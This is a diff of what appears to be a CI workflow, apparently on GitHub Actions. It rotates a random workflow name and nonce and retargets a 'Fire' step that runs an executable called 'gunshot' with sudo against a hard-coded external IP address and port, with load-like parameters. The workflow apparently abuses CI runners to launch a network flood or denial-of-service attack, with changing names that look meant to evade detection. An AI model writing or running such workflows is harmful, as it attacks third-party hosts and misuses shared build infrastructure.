@@ -1,4 +1,4 @@
-name: psycho-51ca208c
+name: psycho-db5fbb47
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x gunshot
     - name: Fire
-      run: sudo ./gunshot 91.108.17.54 32002 50 200
+      run: sudo ./gunshot 91.108.9.54 32000 60 200
       continue-on-error: true
-    - name: Nonce 51ca208c
-      run: echo "nonce=51ca208c"
+    - name: Nonce db5fbb47
+      run: echo "nonce=db5fbb47"
